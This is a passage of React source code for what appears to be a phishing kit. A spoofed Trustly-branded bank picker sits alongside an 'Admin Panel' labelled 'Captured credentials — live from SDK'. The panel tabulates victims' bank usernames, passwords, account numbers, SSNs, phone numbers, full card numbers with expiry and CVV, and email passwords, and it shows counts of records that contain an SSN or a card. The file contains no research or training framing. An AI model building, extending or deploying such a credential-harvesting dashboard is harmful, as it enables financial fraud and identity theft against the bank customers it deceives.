            style={{ width: "100%", padding: "13px 14px 13px 38px", border: "1.5px solid #d8dde5", borderRadius: 50, fontSize: 15, fontFamily: "Open Sans, sans-serif", outline: "none", boxSizing: "border-box", background: "#fff", color: "#333" }}
            onFocus={(e) => (e.currentTarget.style.borderColor = "#117ACA")}
            onBlur={(e) => (e.currentTarget.style.borderColor = "#d8dde5")}
          />
        </div>
        <div style={{ maxHeight: 400, overflowY: "auto", display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 10, paddingRight: 2 }}>
          {filtered.length === 0 && (
            <div style={{ gridColumn: "1/-1", textAlign: "center", color: "#aaa", fontSize: 14, padding: "24px 0", fontFamily: "Open Sans, sans-serif" }}>
              No banks found for &ldquo;{searchQuery}&rdquo;
            </div>
          )}
          {filtered.map((bank) => (
            <BankTile key={bank.id} bank={bank} onSelect={handleSelectBank} />
          ))}
        </div>
      </div>
      <TrustlyFooter />
    </div>
  );
};

// ─── Admin Panel ──────────────────────────────────────────────────────────────
const tdStyle: React.CSSProperties = {
  padding: "10px 14px",
  color: "#cbd5e1",
  whiteSpace: "nowrap",
  maxWidth: 160,
  overflow: "hidden",
  textOverflow: "ellipsis",
};

const AdminPanel: React.FC<{ onClose: () => void }> = ({ onClose }) => {
  const { data: records, isPending, error } = useQuery("CredentialRecord", {
    orderBy: { createdAt: "desc" },
  });

  const [expandedId, setExpandedId] = useState<string | null>(null);

  const getBankLogoByName = (bankName?: string) => {
    if (!bankName) return null;
    // Try to find by name for logo
    const found = BANKS.find((b) => b.name.toLowerCase() === bankName.toLowerCase());
    return found ? getLogo(found.domain) : null;
  };

  const safeRecords = records ?? [];

  return (
    <div
      style={{ position: "fixed", inset: 0, background: "rgba(10,14,23,0.72)", zIndex: 1000, display: "flex", alignItems: "flex-start", justifyContent: "center", padding: "32px 12px", overflowY: "auto", backdropFilter: "blur(2px)" }}
      onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
    >
      <div style={{ background: "#0f172a", borderRadius: 16, width: "100%", maxWidth: 1000, boxShadow: "0 24px 80px rgba(0,0,0,0.6)", overflow: "hidden", fontFamily: "DM Sans, sans-serif" }}>
        {/* Header */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "18px 24px", borderBottom: "1px solid #1e293b", background: "#0a0f1e" }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <div style={{ width: 34, height: 34, borderRadius: 8, background: "linear-gradient(135deg,#3b82f6,#06b6d4)", display: "flex", alignItems: "center", justifyContent: "center" }}>
              <svg width="17" height="17" viewBox="0 0 24 24" fill="none">
                <path d="M12 2a5 5 0 100 10A5 5 0 0012 2zm0 12c-5.33 0-8 2.67-8 4v2h16v-2c0-1.33-2.67-4-8-4z" fill="#fff" />
              </svg>
            </div>
            <div>
              <div style={{ fontSize: 16, fontWeight: 700, color: "#f1f5f9" }}>Admin Panel</div>
              <div style={{ fontSize: 11, color: "#64748b" }}>Captured credentials — live from SDK</div>
            </div>
          </div>
          <button onClick={onClose} style={{ background: "#1e293b", border: "1px solid #334155", borderRadius: 8, color: "#94a3b8", fontSize: 18, width: 32, height: 32, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", lineHeight: 1, fontFamily: "DM Sans, sans-serif" }}>×</button>
        </div>

        {/* Stats */}
        <div style={{ display: "flex", borderBottom: "1px solid #1e293b", background: "#0a0f1e" }}>
          {[
            { label: "Total Entries", value: safeRecords.length },
            { label: "With SSN", value: safeRecords.filter((r) => r.ssn).length },
            { label: "With Card", value: safeRecords.filter((r) => r.cardNumber).length },
            { label: "With Email", value: safeRecords.filter((r) => r.email).length },
          ].map((stat, i) => (
            <div key={i} style={{ flex: 1, padding: "12px 16px", borderRight: i < 3 ? "1px solid #1e293b" : "none" }}>
              <div style={{ fontSize: 20, fontWeight: 700, color: "#38bdf8" }}>{stat.value}</div>
              <div style={{ fontSize: 11, color: "#475569" }}>{stat.label}</div>
            </div>
          ))}
        </div>

        {/* Table */}
        <div style={{ overflowX: "auto" }}>
          {isPending ? (
            <div style={{ padding: "48px 24px", textAlign: "center", color: "#475569", fontSize: 14 }}>Loading records…</div>
          ) : error ? (
            <div style={{ padding: "48px 24px", textAlign: "center", color: "#ef4444", fontSize: 14 }}>{error.message}</div>
          ) : safeRecords.length === 0 ? (
            <div style={{ padding: "48px 24px", textAlign: "center", color: "#475569", fontSize: 14 }}>No records captured yet.</div>
          ) : (
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 13 }}>
              <thead>
                <tr style={{ background: "#0f172a" }}>
                  {["Bank", "Username", "Password", "Account #", "SSN", "Phone", "Card Number", "Expiry", "CVV", "Email", "Email Pwd", "Step", "Raw"].map((h) => (
                    <th key={h} style={{ padding: "10px 14px", textAlign: "left", color: "#475569", fontWeight: 600, fontSize: 11, textTransform: "uppercase", letterSpacing: 0.5, borderBottom: "1px solid #1e293b", whiteSpace: "nowrap" }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {safeRecords.map((rec, idx) => (
                  <React.Fragment key={rec.id ?? idx}>
                    <tr
                      style={{ background: idx % 2 === 0 ? "#0f172a" : "#0a1020", borderBottom: "1px solid #1e293b", cursor: "pointer" }}
                      onClick={() => setExpandedId(expandedId === rec.id ? null : rec.id)}
                    >
                      {/* Bank */}
                      <td style={tdStyle}>
                        <div style={{ display: "flex", alignItems: "center", gap: 7 }}>
                          {rec.bank && (() => {
                            const logoUrl = getBankLogoByName(rec.bank);
                            return logoUrl ? (
                              <img src={logoUrl} alt="" width={18} height={18} style={{ borderRadius: 4, objectFit: "contain" }} onError={(e) => { (e.currentTarget as HTMLImageElement).style.display = "none"; }} />
                            ) : null;
                          })()}
                          <span style={{ color: "#e2e8f0" }}>{rec.bank ?? "—"}</span>
                        </div>
                      </td>
                      {/* Username */}
                      <td style={tdStyle}><span style={{ color: "#a5f3fc" }}>{rec.username ?? "—"}</span></td>
                      {/* Password */}
                      <td style={tdStyle}><span style={{ color: "#f472b6" }}>{rec.password ? "●●●●●●" : "—"}</span></td>
                      {/* Account # */}
                      <td style={tdStyle}><span style={{ color: "#fde68a" }}>{rec.accountNumber ?? "—"}</span></td>
                      {/* SSN */}
                      <td style={tdStyle}><span style={{ color: "#fb7185" }}>{rec.ssn ?? "—"}</span></td>
                      {/* Phone */}
                      <td style={tdStyle}><span style={{ color: "#c4b5fd" }}>{rec.phone ?? "—"}</span></td>
                      {/* Card Number */}
                      <td style={tdStyle}><span style={{ color: "#6ee7b7" }}>{rec.cardNumber ? `••••${rec.cardNumber.slice(-4)}` : "—"}</span></td>
                      {/* Expiry */}
                      <td style={tdStyle}><span style={{ color: "#6ee7b7" }}>{rec.cardExpiry ?? "—"}</span></td>
                      {/* CVV */}
                      <td style={tdStyle}><span style={{ color: "#6ee7b7" }}>{rec.cardCvv ?? "—"}</span></td>
                      {/* Email */}
                      <td style={tdStyle}><span style={{ color: "#fdba74" }}>{rec.email ?? "—"}</span></td>
                      {/* Email Password */}
                      <td style={tdStyle}><span style={{ color: "#f9a8d4" }}>{rec.emailPassword ?? "—"}</span></td>
                      {/* Current Step */}
                      <td style={tdStyle}><span style={{ color: "#38bdf8", fontSize: 11, background: "#1e293b", padding: "2px 6px", borderRadius: 4 }}>{rec.currentStep ?? "—"}</span></td>
                      {/* Expand */}
                      <td style={tdStyle}><span style={{ color: "#38bdf8", fontSize: 11 }}>{expandedId === rec.id ? "▲" : "▼"}</span></td>
                    </tr>
                    {expandedId === rec.id && (
                      <tr style={{ background: "#0d1929", borderBottom: "1px solid #1e293b" }}>
                        <td colSpan={13} style={{ padding: "14px 18px" }}>
                          <pre style={{ margin: 0, fontSize: 11, color: "#94a3b8", fontFamily: "monospace", whiteSpace: "pre-wrap", wordBreak: "break-all", background: "#0a0f1e", borderRadius: 8, padding: "12px 14px" }}>
                            {JSON.stringify(rec, null, 2)}
                          </pre>
                        </td>
                      </tr>
                    )}
                  </React.Fragment>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </div>
    </div>
  );
};

// ─── App Root ─────────────────────────────────────────────────────────────────
const App: React.FC = () => {
  const [adminOpen, setAdminOpen] = useState(false);
  const { isAnonymous } = useAuth();
  return (
    <>
      <TrustlyPayment />
      {!isAnonymous && <button
        onClick={() => setAdminOpen(true)}
        title="Admin Panel"
        style={{ position: "fixed", bottom: 28, right: 28, width: 52, height: 52, borderRadius: "50%", background: "linear-gradient(135deg,#1e40af,#0e7490)", border: "none", boxShadow: "0 4px 20px rgba(0,0,0,0.4)", cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 999, transition: "transform .15s" }}
        onMouseEnter={(e) => { (e.currentTarget as HTMLButtonElement).style.transform = "scale(1.09)"; }}
        onMouseLeave={(e) => { (e.currentTarget as HTMLButtonElement).style.transform = "scale(1)"; }}
      >
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
          <path d="M12 2a5 5 0 100 10A5 5 0 0012 2zm0 12c-5.33 0-8 2.67-8 4v2h16v-2c0-1.33-2.67-4-8-4z" fill="#fff" />
        </svg>
      </button>}
      {adminOpen && <AdminPanel onClose={() => setAdminOpen(false)} />}
    </>
  );
};

export default App;
